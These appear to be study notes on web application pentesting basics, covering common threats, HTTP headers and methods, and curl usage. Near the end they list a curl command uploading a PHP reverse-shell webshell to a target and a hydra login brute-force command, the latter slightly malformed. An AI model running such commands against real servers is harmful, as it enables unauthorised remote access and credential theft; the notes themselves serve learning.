**Web applications** are websites with interactive and dynamic functionality which allows users to interact with and store their data through web browsers. (Facebook, Amazon, Gmail, Microsoft Office, etc)

Web apps are cross-platform (every OS and device can access) and stateless (web apps remember user interactions via sessions).

**Web Application Security** protects web apps from security threats.

**Web Application Security Testing** is the process of finding and mitigating vulnerabilities in web apps, **Web App Pentesting** is a subset of Web A. Sec Testing that is focused on exploiting identified vulnerabilities.

**Threat** is a source of harm (a dangerous event) which exploits found vulnerabilities. **Risk** is the impact of a threat.

Threats can be SQLi, XSS, CSRF, etc.

Risks can be data manipulatio, session hijacking, etc.

- **SQLi** - attackers inject malicious SQL code into an input field, and this leads to data access
- **XSS** - attackers inject malicious scripts into web pages leading to data access
- **CSRF**  (Cross-Site Request Forgery) - attackers exploit active sessions, then they make users change their account details

**Web Application Architecture - Client-Server Model**

Client - represents our user interface (browser) which displays web pages. Front-end of a web application.

Server - represents back-end, process client requests, executes businees logic.

HTTP - used for transmission of web app data, has 2 version HTTP 1.0/1.1

### HTTP Request Compenents

- First request line contains: HTTP Method, URL, HTTP version — `GET / HTTP/1.1`
- HTTP Headers: `User-Agent` - browser type, OS, language
    - `Host` - server DNS name
    - `Accept` - accepted media type/extension
    - `Accept-Encoding` - accepting encoding via specified tools (gzip)
    - `Connection: keep-alive` - only valid for HTTP/1,1 (connection isn’t terminated for unspecified amount of time)
    

### HTTP Methods

- GET - used for retrieving data
- POST - submitting data
- PUT - updating or creating a resource
- DELETE - removing a resource
- PATCH - applying modifications
- HEAD - retrieves only response headers
- OPTIONS - retrieving communication options

### HTTP Responses

- Content-Type - media type being requested
- Content-Length - the size of the response body
- Set-Cookie - setting cookies on the client side for following requests
- Cache-Control - caching rules

## Curl - URL transferer

- `curl -v http://<ip>` - gives HTTP request and response headers (verbose)
- `curl -v -I http://<ip>` - gives only response headers
- `curl -v -X OPTIONS http://<ip>` - supported HTTP headers
- `curl -v http://<ip>/uploads —upload-file /usr/share/webshells/php/php-reverse-shell.php` - if we have a POST right, we can upload a file.
- `curl -v -X DELETE http://<ip>/uploads/<file>` - deletes the file

HTTP sends requests via clear-text and doesn’t provide strong authentication. Meanwhile, HTTPS encrypts the data sent over the network via SSL/TLS

- `hydra -l user -P list.txt http-post-form ‘//<ip>/login.php:name=^PASS^&password=^PASS^:Invalid credentials”`
